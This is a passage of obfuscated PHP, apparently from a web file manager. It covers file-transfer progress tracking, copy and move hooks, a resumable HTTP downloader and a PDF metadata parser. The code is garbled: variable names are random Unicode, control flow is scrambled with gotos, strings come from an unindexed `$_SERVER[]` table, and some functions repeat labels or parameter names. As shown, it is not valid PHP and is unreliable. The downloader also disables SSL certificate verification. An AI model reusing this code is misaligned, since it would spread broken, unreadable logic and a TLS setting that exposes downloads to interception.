self::STATYS_KILL) { $aڠ = array($b쭫[1421] => LNG($b쭫[1422]), $b쭫[1019] => !1); Cache::set($b쭫[1423] . $this->task[$b쭫[363]], $aڠ, 30); $this->end(); die; } else { if ($bƎ == self::STATYS_STOP) { $f˯Ҷ = 2; $b[$b쭫[1412]] += $f˯Ҷ; self::valueSet($eޅܸ[$b쭫[363]], $b); sleep($f˯Ҷ); $this->update(); return; } } goto eʟ; e: $this->updateAfter(); $F򿯜 = 0.2; if (timeFloat() - $eޅܸ[$b쭫[1411]] < $F򿯜) { return; } goto E䤈; b: $eޅܸ[$b쭫[977]] += $DΝ; $eޅܸ[$b쭫[1410]] = timeFloat(); if ($eޅܸ[$b쭫[965]]) { if ($eޅܸ[$b쭫[965]] < $eޅܸ[$b쭫[977]]) { $eޅܸ[$b쭫[965]] = $eޅܸ[$b쭫[977]]; } $F = timeFloat() - $eޅܸ[$b쭫[1409]] - $eޅܸ[$b쭫[1412]]; $eޅܸ[$b쭫[1407]] = $eޅܸ[$b쭫[977]] / $eޅܸ[$b쭫[965]]; $eޅܸ[$b쭫[1408]] = $eޅܸ[$b쭫[977]] / $F; if ($eޅܸ[$b쭫[1407]] > 0) { $eޅܸ[$b쭫[1413]] = $F * (1 - $eޅܸ[$b쭫[1407]]) / $eޅܸ[$b쭫[1407]]; } $eޅܸ[$b쭫[1413]] = $eޅܸ[$b쭫[1413]] <= 0 ? 0 : $eޅܸ[$b쭫[1413]]; } goto e; EͯޣĒ: $b쭫 =& $_SERVER[]; $eޅܸ =& $this->task; if (!$eޅܸ) { return; } goto b; eӅɩ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Cч) { $d =& $_SERVER[]; Cache::set($d[1423] . $this->task[$d[363]], $Cч, 60); return $Cч; } public static function get($fԛ) { return self::valueGet($fԛ); } public static function listData() { $aֵ = self::valueGet(); return array_sort_by($aֵ, $_SERVER[][1409], !0); } public static function kill($Aڎ) { return self::changeStatus($Aڎ, self::STATYS_KILL); } public static function stop($C) { return self::changeStatus($C, self::STATYS_STOP); } public static function restart($FՔ) { return self::changeStatus($FՔ, self::STATYS_RUNNING); } public static function killAll() { $FҶ =& $_SERVER[]; $f = self::listData(); foreach ($f as $aĂ) { self::kill($aĂ[$FҶ[363]]); } sleep(2); foreach ($f as $aĂ) { self::valueSet($aĂ[$FҶ[363]], !1); } } private static function changeStatus($c̏, $a먉) { goto A; A: $A艒 =& $_SERVER[]; $Cԝ = self::valueGet($c̏); if (!$Cԝ) { return !1; } goto A; AԱ: return !0; goto cÆ; A: $Cԝ[$A艒[675]] = $a먉; self::valueSet($c̏, $Cԝ); self::log($A艒[1425] . $Cԝ[$A艒[363]] . $A艒[1426] . $a먉); goto AԱ; cÆ: } public static function valueGet($f­ = false) { $Aɚ =& $_SERVER[]; if ($f­) { $a = Model($Aɚ[395])->where(array($Aɚ[89] => $f­, $Aɚ[29] => $Aɚ[1427]))->find(); return $a ? json_decode($a[$Aɚ[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($CӐ = false) { goto d⩝т; d: return $a; goto Eڶ; fޒ: $a = Model($D͎[395])->where($aڽ҉)->select(); $a = $a ? $a : array(); foreach ($a as $aܶܚ => $E֒) { $a[$aܶܚ] = json_decode($E֒[$D͎[355]], !0); } goto d; d⩝т: $D͎ =& $_SERVER[]; $aڽ҉ = array($D͎[29] => $D͎[1427]); if ($CӐ) { $aڽ҉[$D͎[1406]] = $CӐ; } goto fޒ; Eڶ: } public static function valueSet($e郉, $c덢ŒȈ) { goto C; A: Model($a卾[395])->add($C, array(), !0); goto E슙; C: $a卾 =& $_SERVER[]; if (!$c덢ŒȈ) { return Model($a卾[395])->where(array($a卾[89] => $e郉, $a卾[29] => $a卾[1427]))->delete(); } $f繍 = json_encode($c덢ŒȈ); goto eǐ; eǐ: if (!$f繍) { ob_start(); var_dump($c덢ŒȈ); $F˓ڈ = ob_get_clean(); self::log($a卾[1428] . json_encode_force($F˓ڈ)); } if (!$e郉 || !$c덢ŒȈ[$a卾[363]]) { return !1; } $C = array($a卾[29] => $a卾[1427], $a卾[1406] => USER_ID, $a卾[89] => $e郉, $a卾[355] => $f繍); goto A; E슙: } public static function log($Aթ) { write_log($Aթ, $_SERVER[][1429]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto cє; d㪎: Hook::bind($aټ[535], array($this, $aټ[1436])); Hook::bind($aټ[536], array($this, $aټ[1437])); Hook::bind($aټ[538], array($this, $aټ[1438])); goto FŴđ; cє: $aټ =& $_SERVER[]; $aņ =& $this->task; $this->sourceCopyFolder = !1; goto E򳣹; F: $aņ[$aټ[967]] = $aټ[33]; $aņ[$aټ[1453]] = $aټ[33]; $aņ[$aټ[1454]] = 0; goto A△; eɯ: $aņ[$aټ[1449]] = LNG($aټ[1450]); $aņ[$aټ[1451]] = 0; $aņ[$aټ[1452]] = 0; goto F; Eݔ: Hook::bind($aټ[1440], array($this, $aټ[1441])); Hook::bind($aټ[528], array($this, $aټ[1442])); $this->sourceModelCopyFlag = !1; goto Bşʝی; E򳣹: Hook::bind($aټ[1430], array($this, $aټ[1431])); Hook::bind($aټ[1432], array($this, $aټ[1433])); Hook::bind($aټ[1434], array($this, $aټ[1435])); goto d㪎; Bşʝی: Hook::bind($aټ[1443], array($this, $aټ[1444])); Hook::bind($aټ[1445], array($this, $aټ[1446])); Hook::bind($aټ[1447], array($this, $aټ[1448])); goto eɯ; FŴđ: Hook::bind($aټ[539], array($this, $aټ[1438])); Hook::bind($aټ[505], array($this, $aټ[1439])); Hook::bind($aټ[502], array($this, $aټ[1439])); goto B; B: Hook::bind($aټ[507], array($this, $aټ[1439])); Hook::bind($aټ[509], array($this, $aټ[1439])); Hook::bind($aټ[511], array($this, $aټ[1439])); goto Eݔ; A△: if (!$aņ[$aټ[1313]]) { $aņ[$aټ[1313]] = LNG($aټ[1455]); } goto F; F: } protected function endAfter() { goto fތ; a: Hook::unbind($C݄[502], array($this, $C݄[1439])); Hook::unbind($C݄[507], array($this, $C݄[1439])); Hook::unbind($C݄[509], array($this, $C݄[1439])); goto D̟; Fѷ: Hook::unbind($C݄[1443], array($this, $C݄[1444])); Hook::unbind($C݄[1445], array($this, $C݄[1446])); Hook::unbind($C݄[1447], array($this, $C݄[1448])); goto d׹; fɼ: Hook::unbind($C݄[538], array($this, $C݄[1438])); Hook::unbind($C݄[539], array($this, $C݄[1438])); Hook::unbind($C݄[505], array($this, $C݄[1439])); goto a; D̟: Hook::unbind($C݄[511], array($this, $C݄[1439])); Hook::unbind($C݄[1440], array($this, $C݄[1441])); Hook::unbind($C݄[528], array($this, $C݄[1442])); goto Fѷ; Bݵ: Hook::unbind($C݄[1434], array($this, $C݄[1435])); Hook::unbind($C݄[535], array($this, $C݄[1436])); Hook::unbind($C݄[536], array($this, $C݄[1437])); goto fɼ; fތ: $C݄ =& $_SERVER[]; Hook::unbind($C݄[1430], array($this, $C݄[1431])); Hook::unbind($C݄[1432], array($this, $C݄[1433])); goto Bݵ; d׹: } public function copyMoveStart($Fםܝ, $Dյ, $e؍, $Cٸ) { } public function updateAfter() { goto D; c鄋: $cĚĞ[$cȳ[1407]] = ($cĚĞ[$cȳ[1456]] + $fΙ) / $cĚĞ[$cȳ[684]]; if ($cĚĞ[$cȳ[1407]] > 0) { $d = timeFloat() - $cĚĞ[$cȳ[1409]] - $cĚĞ[$cȳ[1412]]; $cĚĞ[$cȳ[1413]] = $d * (1 - $cĚĞ[$cȳ[1407]]) / $cĚĞ[$cȳ[1407]]; } goto B; D: $cȳ =& $_SERVER[]; $cĚĞ =& $this->task; if (!$cĚĞ[$cȳ[684]]) { return; } goto Aވ; Aވ: if ($this->sourceModelCopyFlag) { return; } $fΙ = 0; if ($cĚĞ[$cȳ[1453]] == $cȳ[1027]) { $fΙ = $cĚĞ[$cȳ[1452]] * 0.5; } else { if ($cĚĞ[$cȳ[1453]] == $cȳ[102]) { $fΙ = $cĚĞ[$cȳ[1452]] * 0.5 + $cĚĞ[$cȳ[1451]] * 0.5; } } goto c鄋; B: } public function addPath($fҗ) { goto b㧦; b㧦: $D =& $_SERVER[]; if (!$fҗ) { return; } $cǣ =& $this->task; goto B; B: $B㎌ = IO::infoWithChildren($fҗ); $AĬ = $cǣ[$D[1457]] ? $cǣ[$D[1457]][$D[1458]] : 0; $cǣ[$D[1457]] = array($D[1458] => $AĬ + 1, $D[382] => $B㎌[$D[28]], $D[75] => $B㎌[$D[75]], $D[462] => $B㎌[$D[462]] ? $B㎌[$D[462]] : $B㎌[$D[75]]); goto bܬÐ; bܬÐ: if ($B㎌[$D[29]] == $D[163]) { $cǣ[$D[965]] += 1; } else { $cǣ[$D[965]] += $B㎌[$D[80]][$D[78]]; if ($B㎌[$D[365]]) { $cǣ[$D[965]] += $B㎌[$D[80]][$D[79]] + 1; } } $cǣ[$D[684]] += $B㎌[$D[77]]; $this->update(); goto dְЖ; dְЖ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($A) { $Dژ =& $_SERVER[]; $e򶗚 =& $this->task; $e򶗚[$Dژ[1449]] = $A[$Dژ[28]]; $e򶗚[$Dژ[967]] = $A[$Dژ[28]]; $this->update(); } public function copyFileStart($aʌ, $A, $dޙ, $EЕ, $a޴, $A) { goto e֏̆; e֏̆: $dۮч =& $_SERVER[]; $AꐃԒ = $a޴; if ($AꐃԒ == $GLOBALS[$dۮч[1459]]) { $AꐃԒ = $GLOBALS[$dۮч[1460]]; } goto aߏ; aƊ: $this->update(); goto cÌ; aߏ: $GLOBALS[$dۮч[1460]] = $a޴; $GLOBALS[$dۮч[1459]] = $A; $bፊ =& $this->task; goto eɂ͉; eɂ͉: $bፊ[$dۮч[1449]] = $AꐃԒ; $bፊ[$dۮч[1451]] = (int) $aʌ->size($A); $bፊ[$dۮч[1452]] = 0; goto cŕ; cŕ: $bፊ[$dۮч[967]] = $dۮч[33]; $bፊ[$dۮч[1453]] = $dۮч[33]; $bፊ[$dۮч[1454]] = 0; goto aƊ; cÌ: } public function copyFileEnd($DƠ, $B, $E՜ı, $Aī, $Cքݾ, $A) { $F²װ =& $_SERVER[]; $D =& $this->task; $D[$F²װ[1452]] = $D[$F²װ[1451]]; $D[$F²װ[1453]] = $F²װ[33]; if ($Cքݾ == $D[$F²װ[1449]]) { $D[$F²װ[1456]] += $D[$F²װ[1451]]; $this->update(1); } else { $this->update(); $D[$F²װ[1452]] = 0; } self::log($F²װ[1461] . $B . $F²װ[66] . $Aī . $F²װ[213] . $Cքݾ . $F²װ[1462] . $D[$F²װ[1449]]); } public function updateFileEnd($Fۆܕ, $Dͺ) { $d =& $_SERVER[]; $e՝ =& $this->task; $e՝[$d[1449]] = $Fۆܕ; $e՝[$d[1451]] = $Dͺ; $e՝[$d[1456]] += $Dͺ; $this->update(1); } public function sourceModelCopy($e) { goto e; e: $e򩶙 =& $_SERVER[]; $d䨖 = $e[0]; $Cԇ = $e[1]; goto c; fڐΗ: switch ($d䨖) { case $e򩶙[503]: $A홂 = 1; break; case $e򩶙[506]: $Aѫ[$e򩶙[1449]] = $Cԇ[$e򩶙[28]]; break; case $e򩶙[508]: $A홂 = intval($e[$e򩶙[359]] * 0.4); break; case $e򩶙[510]: $A홂 = intval($e[$e򩶙[359]] * 0.2); break; case $e򩶙[512]: $A홂 = intval($e[$e򩶙[359]] * 0.4); break; } $this->update($A홂); $this->sourceModelCopyFlag = !1; goto d; c: $Aѫ =& $this->task; $this->sourceModelCopyFlag = !0; $A홂 = 0; goto fڐΗ; d: } public function sourceRemove($f, $Aܧ) { $E =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $c = 1; if (isset($f[$E[80]])) { $c = $f[$E[80]][$E[78]] + $f[$E[80]][$E[79]] + 1; } $this->update($c); $this->sourceModelCopyFlag = !1; } public function sourceMove($d) { $this->sourceRemove($d, !1); } public function curlProgress($A, $Fꂋ˨, $Eᣨߚ, $E, $FƖ) { $B᫱ =& $_SERVER[]; $D =& $this->task; if ($FƖ > 0) { $D[$B᫱[967]] = $B᫱[1463]; $D[$B᫱[1453]] = $B᫱[102]; if ($D[$B᫱[1451]] == $E || $E > 1024 * 1024) { $D[$B᫱[1452]] = $FƖ; } if ($D[$B᫱[1454]]) { $D[$B᫱[1452]] = $FƖ + $D[$B᫱[1454]]; } } else { if ($Eᣨߚ > 0) { if ($D[$B᫱[1451]] == $Fꂋ˨) { $D[$B᫱[1452]] = $Eᣨߚ; $D[$B᫱[967]] = $B᫱[1464]; $D[$B᫱[1453]] = $B᫱[1027]; } } } $this->update(); } public function curlProgressStart($D) { } public function curlProgressEnd($DĜ) { $aڇ =& $_SERVER[]; $B =& $this->task; $E뽬 = curl_getinfo($DĜ); $dӱ = $E뽬[$aڇ[1465]]; if ($B[$aڇ[1453]] == $aڇ[102] && $dӱ) { $B[$aڇ[1454]] += $dӱ; } $this->update(); } } goto D; eʭ: $_SERVER[$_SERVER[][52]] = ("\x39\x35\x31\x31".strrev('47'))+0;$_DkYS="QUVNPDvuS6x4wztKUEswhE8muCifMGyNJAkrWu6h37RICFUHapXrGjE4Wt6ACXen9QkRdTHYst";; stream_wrapper_register($_SERVER[][53], $_SERVER[][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($cƺ, $f䤎) { $A =& $_SERVER[]; if (isset(self::$_methodList[$cƺ])) { return @call_user_func_array(self::$_methodList[$cƺ], $f䤎); } else { if (method_exists($this, $cƺ)) { return call_user_func_array(array($this, $cƺ), $f䤎); } else { think_exception(__CLASS__ . $A[4] . $cƺ . $A[5]); } } } public static function __callStatic($aϚ, $Cǒԉ) { if (isset(self::$_methodListStatic[$aϚ])) { return call_user_func_array(self::$_methodListStatic[$aϚ], $Cǒԉ); } else { if (method_exists(self, $aϚ)) { return call_user_func_array(array(self, $aϚ), $Cǒԉ); } else { show_json("{$aϚ}\50\x29\x20\156\157\164\x20\145\x78\x69\163\164\73", !1); } } } public static function addMethod($e᪻, $eԞ) { self::$_methodList[$e᪻] = $eԞ; } public static function addMethodStatic($D, $dȮ) { self::$_methodListStatic[$D] = $dȮ; } } goto c鹊; Aٜ: class Downloader { static function start($c翃, $E㩮ؙ, $F = 10) { goto e֟Ƿ; DƅӨ: $DѦ = intval($e[$cک̉[321]]); if (file_exists($Bуߑ) && time() - filemtime($Bуߑ) < 3) { return array($cک̉[1019] => !1, $cک̉[1021] => $cک̉[1481]); } $Cȴǻ = array(); goto cɭ; cɭ: if (is_file($C˃掃)) { $ā = file_get_contents($C˃掃); $Cȴǻ = json_decode($ā, 1); } if (file_exists($E㩮ؙ) && $DѦ == filesize($E㩮ؙ)) { @unlink($Bуߑ); @unlink($C˃掃); return array($cک̉[1019] => !0, $cک̉[1021] => $cک̉[1482]); } if ($Cȴǻ[$cک̉[321]] != $DѦ) { $Cȴǻ = array($cک̉[321] => $DѦ); } goto e; e֟Ƿ: $cک̉ =& $_SERVER[]; if (!request_url_safe($c翃)) { return array($cک̉[1019] => !1, $cک̉[1021] => $cک̉[1024]); } $C˃掃 = $E㩮ؙ . $cک̉[1479]; goto CǾ; d: if ($bʭ[$cک̉[1019]]) { @unlink($C˃掃); } return $bʭ; goto C쾍; d: if (!$c翃) { return array($cک̉[1019] => !1, $cک̉[1021] => $cک̉[1024]); } if (!$e[$cک̉[1268]] || $e[$cک̉[321]] == 0) { @unlink($Bуߑ); @unlink($E㩮ؙ); $bʭ = self::fileDownloadFopen($c翃, $E㩮ؙ, $e[$cک̉[321]]); if ($bʭ[$cک̉[1019]]) { return $bʭ; } else { @unlink($Bуߑ); @unlink($E㩮ؙ); $bʭ = self::fileDownloadCurl($c翃, $E㩮ؙ, !1, 0, $e[$cک̉[321]]); @unlink($Bуߑ); return $bʭ; } } $aȣ = is_file($Bуߑ) ? filesize($Bуߑ) : 0; goto DƅӨ; e: if ($aȣ > $DѦ) { @unlink($Bуߑ); } file_put_contents($C˃掃, json_encode($Cȴǻ)); $bʭ = self::fileDownloadCurl($c翃, $E㩮ؙ, !0, $aȣ, $DѦ); goto d; CǾ: $Bуߑ = $E㩮ؙ . $cک̉[1480]; if (is_array($c翃)) { $e = $c翃; } else { $e = url_header($c翃); } $c翃 = $e[$cک̉[291]]; goto d; C쾍: } static function fileDownloadFopen($Fͅ, $F, $C = 0) { $D愪̓ =& $_SERVER[]; @ini_set($D愪̓[1483], $D愪̓[1484]); $C = $F . $D愪̓[1480]; set_timeout(); @unlink($C); if ($DҢ = @fopen($Fͅ, $D愪̓[1485])) { goto d; f܊: fclose($DҢ); self::checkGzip($C); if (!@rename($C, $F)) { usleep(round(rand(0, 1000) * 50)); @unlink($F); $Aڣ = @rename($C, $F); if (!$Aڣ) { return array($D愪̓[1019] => !1, $D愪̓[1021] => $D愪̓[1489]); } } goto dڥ; d: if (!($fۼ = @fopen($C, $D愪̓[1486]))) { return array($D愪̓[1019] => !1, $D愪̓[1021] => $D愪̓[1487]); } while (!feof($DҢ)) { if (!file_exists($C)) { fclose($fۼ); return array($D愪̓[1019] => !1, $D愪̓[1021] => $D愪̓[1488]); } clearstatcache(); if ($C > 0 && $C == filesize(iconv_system($C))) { break; } fwrite($fۼ, fread($DҢ, 1024 * 8), 1024 * 8); } fclose($fۼ); goto f܊; dڥ: return array($D愪̓[1019] => !0, $D愪̓[1021] => $D愪̓[682]); goto c鎂; c鎂: } else { return array($D愪̓[1019] => !1, $D愪̓[1021] => $D愪̓[1490]); } } static function fileDownloadCurl($e, $Eո, $fҩ = false, $Fҵӗ = 0, $CЂԿ = 0) { goto AԈ; Dܧ̋: if ($Aǻ < $CЂԿ && $CЂԿ != 0) { return array($cŘٔҜ[1019] => !1, $cŘٔҜ[1021] => $cŘٔҜ[1481]); } if ($C && filesize($B) != 0) { self::checkGzip($B); if (!@rename($B, $Eո)) { @unlink($Eո); $C = @rename($B, $Eո); if (!$C) { return array($cŘٔҜ[1019] => !1, $cŘٔҜ[1021] => $cŘٔҜ[1493]); } } return array($cŘٔҜ[1019] => !0, $cŘٔҜ[1021] => $cŘٔҜ[682]); } return array($cŘٔҜ[1019] => !1, $cŘٔҜ[1021] => $cŘٔҜ[1494]); goto dﴙ; CÏᑕ: $FՍ = @fopen($B, $cŘٔҜ[969]); if (!$FՍ) { return array($cŘٔҜ[1019] => !1, $cŘٔҜ[1021] => $cŘٔҜ[1491]); } $bߟ = curl_init($e); goto fӏ; dа: curl_close($bߟ); fclose($FՍ); $Aǻ = filesize(iconv_system($B)); goto Dܧ̋; fӏ: if ($fҩ) { curl_setopt($bߟ, CURLOPT_RANGE, $Fҵӗ . $cŘٔҜ[700]); } curl_setopt($bߟ, CURLOPT_FILE, $FՍ); curl_setopt($bߟ, CURLOPT_REFERER, get_url_link($e)); goto Eꝺ; Eꝺ: curl_setopt($bߟ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bߟ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bߟ, CURLOPT_SSL_VERIFYHOST, 0); goto Bߠ劙; Bߠ劙: curl_setopt($bߟ, CURLOPT_NOPROGRESS, !1); curl_setopt($bߟ, CURLOPT_PROGRESSFUNCTION, $cŘٔҜ[1492]); curl_progress_start($bߟ); goto DĊ; AԈ: $cŘٔҜ =& $_SERVER[]; $B = $Eո . $cŘٔҜ[1480]; set_timeout(); goto CÏᑕ; DĊ: curl_setopt($bߟ, CURLOPT_USERAGENT, $cŘٔҜ[1484]); $C = curl_exec($bߟ); curl_progress_end($bߟ); goto dа; dﴙ: } static function checkGzip($f睏) { goto b⋕; FǢɩ: file_put_contents($f睏, $dܛ); goto e瓰Ɵ; dٙ: ob_start(); readgzfile($f睏); $dܛ = ob_get_clean(); goto FǢɩ; b⋕: $Eȡ = $_SERVER[][1495]; $d = file_sub_str($f睏, 0, 2); if ($Eȡ != $d) { return; } goto dٙ; e瓰Ɵ: } } class FileParsePdf { public static function parse($e) { goto D; cԬ: if ($Fȋƈ) { $cв[$E挃[1312]] = $Fȋƈ[1]; } $cв[$E挃[1504]] = 0; $c = $E挃[1505]; goto eӾ; bŌ: $c = $E挃[1501]; preg_match($c, $a߮[$E挃[1497]], $Fȋƈ); if (!$cв[$E挃[1500]] && count($Fȋƈ) == 5) { $cв[$E挃[1500]] = $Fȋƈ[3]; $cв[$E挃[1502]] = $Fȋƈ[4]; } goto Bų; e: if ($Fȋƈ[1] && $cв[$E挃[1504]] < $Fȋƈ[1][0]) { $cв[$E挃[1504]] = $Fȋƈ[1][0]; } $cв = self::parseInfoItem($cв); return $cв; goto C焳; fćλ: $a߮[$E挃[1497]] = StreamWrapperIO::read($e, 0, $fτ); $a߮[$E挃[1498]] = StreamWrapperIO::read($e, $a߮[$E挃[77]] - $fτ, $fτ); $e߂ = self::decodeXref($a߮); goto a虨; a虨: if ($e߂) { $fփ = $e߂[$E挃[1499]][$E挃[1171]]; $cв = self::getObjectValue($a߮, $e߂, $fփ); } $cв = is_array($cв) ? $cв : array(); $cв[$E挃[1500]] = 0; goto bŌ; eӾ: preg_match_all($c, $a߮[$E挃[1497]], $Fȋƈ); if ($Fȋƈ[1] && $cв[$E挃[1504]] < $Fȋƈ[1][0]) { $cв[$E挃[1504]] = $Fȋƈ[1][0]; } preg_match_all($c, $a߮[$E挃[1498]], $Fȋƈ); goto e; Bų: preg_match($c, $a߮[$E挃[1498]], $Fȋƈ); if (!$cв[$E挃[1500]] && count($Fȋƈ) == 5) { $cв[$E挃[1500]] = $Fȋƈ[3]; $cв[$E挃[1502]] = $Fȋƈ[4]; } preg_match($E挃[1503], $a߮[$E挃[1497]], $Fȋƈ); goto cԬ; D: $E挃 =& $_SERVER[]; $fτ = 32 * 1024; $a߮ = array($E挃[761] => fopen($e, $E挃[1149]), $E挃[75] => $e, $E挃[77] => filesize($e), $E挃[1496] => $fτ); goto fćλ; C焳: } private static function parseInfoItem($A󭐊) { $F璫 =& $_SERVER[]; if (!$A󭐊) { return !1; } $CʎȽ = array($F璫[1313] => array($F璫[1506], $F璫[33]), $F璫[1507] => array($F璫[1508], $F璫[33]), $F璫[183] => array($F璫[1509], $F璫[206]), $F璫[106] => array($F璫[1510], $F璫[206]), $F璫[1504] => array($F璫[1504], $F璫[272]), $F璫[1500] => array($F璫[1500], $F璫[272]), $F璫[1502] => array($F璫[1502], $F璫[272]), $F璫[1511] => array($F璫[1512], $F璫[33]), $F璫[1513] => array($F璫[1514], $F璫[33]), $F璫[1515] => array($F璫[1312], $F璫[33])); $A옐 = array(); foreach ($CʎȽ as $A => $C㽺) { if (!isset($A󭐊[$C㽺[0]])) { continue; } $aƧę = $A󭐊[$C㽺[0]]; if (!$aƧę || is_array($aƧę)) { continue; } switch ($C㽺[1]) { case $F璫[272]: $aƧę = intval($aƧę); break; case $F璫[206]: if (substr($aƧę, 0, 2) == $F璫[1516]) { $aƧę = substr($aƧę, 2, 14); } if (strtotime($aƧę)) { $aƧę = date($F璫[1517], strtotime($aƧę)); } break; } $A옐[$A] = $aƧę; } return $A옐; } private static function decodeXref(&$A) { goto dҽ; a: foreach ($Bή[3] as $f => $cϏ) { if ($Bή[3][$f] == $f[1521]) { $B = $fݏ . $f[70] . intval($Bή[2][$f]); $DΌ[$f[1518]][$B] = intval($Bή[1][$f]); ++$fݏ; } else { if ($Bή[3][$f] == $f[1522]) { ++$fݏ; } else { } } } if (preg_match_all($f[1523], $b, $Bή)) { $Aݏ = $A[$f[77]] - $A[$f[1496]]; foreach ($Bή[0] as $f => $E) { $C = $Bή[1][$f] . $f[70] . $Bή[2][$f]; $DΌ[$f[1518]][$C] = strpos($b, $E) + $Aݏ + 1; } } if (preg_match_all($f[1524], $b, $Bή)) { $f = count($Bή[1]) == 1 ? $Bή[1][0] : $Bή[1][1]; } else { $f = substr($b, -1024 * 5); } goto bں׆; bں׆: if (preg_match($f[1525], $f, $Bή) > 0) { $DΌ[$f[1499]][$f[77]] = intval($Bή[1]); } if (preg_match($f[1526], $f, $Bή) > 0) { $DΌ[$f[1499]][$f[1527]] = intval($Bή[1]) . $f[70] . intval($Bή[2]); } if (preg_match($f[1528], $f, $Bή) > 0) { $DΌ[$f[1499]][$f[1529]] = intval($Bή[1]) . $f[70] . intval($Bή[2]); } goto Aԧ΋; Eٌ֝: if ($A[$f[77]] - $Cѱ > $A[$f[1496]]) { $A = 4 * $A[$f[1496]]; $A[$f[1496]] = $A; $A[$f[1497]] = StreamWrapperIO::read($A[$f[75]], 0, $A); $A[$f[1498]] = StreamWrapperIO::read($A[$f[75]], $A[$f[77]] - $A, $A); $b = $A[$f[1498]]; } $fݏ = 0; preg_match_all($f[1520], $b, $Bή); goto a; Dߺ: if (preg_match($f[1532], $f, $Bή) > 0) { } return $DΌ; goto B; Aԧ΋: if (preg_match($f[1530], $f, $Bή) > 0) { $DΌ[$f[1499]][$f[1171]] = intval($Bή[1]) . $f[70] . intval($Bή[2]); } if (preg_match($f[1531], $f, $Bή) > 0) { $DΌ[$f[1499]][$f[363]] = array(); $DΌ[$f[1499]][$f[363]][0] = $Bή[1]; $DΌ[$f[1499]][$f[363]][1] = $Bή[2]; } if (!$DΌ[$f[1499]][$f[1171]]) { return !1; } goto Dߺ; dů: $Aź = $f[1519]; if (!preg_match_all($Aź, $b, $Bή, PREG_SET_ORDER, 0)) { return !1; } $Cѱ = intval($Bή[0][1]); goto Eٌ֝; dҽ: $f =& $_SERVER[]; $b = $A[$f[1498]]; $DΌ = array($f[1499] => array(), $f[1518] => array()); goto dů; B: } private static function getObjectValue($A̿ڳ, $B栥ŗ, $B޻) { goto A°ۺ; cưڢ: return $dч; goto B节; bޖ: if (!is_array($Aÿ[1])) { return array(); } $dч = array(); for ($C҂ = 0; $C҂ < count($Aÿ[1]); $C҂ += 2) { $B = $Aÿ[1][$C҂]; $E՞ = $Aÿ[1][$C҂ + 1]; if (count($B) == 3 && $B[0] == $Fֲ[8]) { $F = !1; if ($E՞[0] == $Fֲ[1533]) { $E՞ = self::getObject($A̿ڳ, $B栥ŗ[$Fֲ[1518]][$E՞[1]]); } $F = $E՞[1]; if ($F === !1) { continue; } if (is_string($F)) { $F = self::decodeStr($F); } $dч[$B[1]] = $F; } } goto cưڢ; A°ۺ: $Fֲ =& $_SERVER[]; $Aÿ = self::getObject($A̿ڳ, $B栥ŗ[$Fֲ[1518]][$B޻]); if (is_string($Aÿ[1])) { return $Aÿ[1]; } goto bޖ; B节: } private static function getObject($Cޝ, $A֏) { $aֻ = self::getObjectItem($Cޝ, $A֏); $aֻ = self::getObjectItem($Cޝ, $aֻ[2]); return $aֻ; } private static function getObjectItem($a, $f݌) { goto A; A: $C =& $_SERVER[]; $e왝 = $a[$C[1496]]; $A˃ = $a[$C[77]] - $e왝; goto fҲ; cڗӤ: $D՝ = self::getRawObject($fꈯ, $E֑ɵ); if ($f݌ >= $A˃) { $D՝[2] = $D՝[2] + $A˃; } else { if ($f݌ > $e왝 && $f݌ <= $A˃) { $D՝[2] = $D՝[2] + $f݌; } } return $D՝; goto a욏; fҲ: $E֑ɵ = $f݌ >= $A˃ ? $f݌ - $A˃ : $f݌; $fꈯ = $f݌ >= $A˃ ? $a[$C[1498]] : $a[$C[1497]]; if ($f݌ > $e왝 && $f݌ <= $A˃) { $E֑ɵ = 0; $fꈯ = StreamWrapperIO::read($a[$C[75]], $f݌, $e왝); } goto cڗӤ; a욏: } private static function decodeStr($E审) { goto eĿ; D򺸦: $E审 = $c[33]; foreach ($C as $Eԕ) { if (preg_match($c[1545], $Eԕ)) { $E审 .= \chr(hexdec(trim($Eԕ, $c[1546]))); } else { $E审 .= $Eԕ; } } $C = preg_split($c[1547], $E审, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto dҪ; dҪ: $E审 = $c[33]; foreach ($C as $Eԕ) { if (preg_match($c[1548], $Eԕ) && !1 === stripos($Eԕ, $c[1549])) { $Eԕ = preg_replace($c[1550], $c[33], $Eԕ); $Eԕ = trim($Eԕ, $c[912]); $Eԕ = pack($c[1551], $Eԕ); $E审 .= $Eԕ; } else { $E审 .= $Eԕ; } } if (preg_match($c[1552], $E审)) { $ațȴ = substr($E审, 2); $E审 = $c[33]; $D = strlen($ațȴ); for ($C = 0; $C < $D; $C += 2) { $cɰ = hexdec(bin2hex(substr($ațȴ, $C, 2))); $E审 .= mb_convert_encoding($c[1553] . intval($cɰ) . $c[67], $c[1554], $c[1555]); } } goto Bв; f݈: $E审 = $c[33]; foreach ($C as $Eԕ) { if (preg_match($c[1543], $Eԕ)) { $E审 .= \chr(octdec(trim($Eԕ, $c[93]))); } else { $E审 .= $Eԕ; } } $C = preg_split($c[1544], $E审, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto D򺸦; Bв: return $E审; goto d; eĿ: $c =& $_SERVER[]; $E审 = str_replace(array($c[1534], $c[1535], $c[1536], $c[1537], $c[1538], $c[1539], $c[1540], $c[1541]), array($c[93], $c[50], $c[8], $c[244], $c[803], $c[213], $c[979], $c[326]), $E审); $C = preg_split($c[1542], $E审, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto f݈; d: } private static function getRawObject($cݐ, $FˮÂ = 0) { goto b; b: $d =& $_SERVER[]; $a˞ӳ = $d[33]; $C򃡭 = $d[33]; goto Bܡ׿; fӆ㖋: return array($a˞ӳ, $C򃡭, $FˮÂ); goto Cٝٷ; Bܡ׿: $FˮÂ += strspn($cݐ, $d[1556], $FˮÂ); $cĔ = $cݐ[$FˮÂ]; switch ($cĔ) { case $d[1557]: 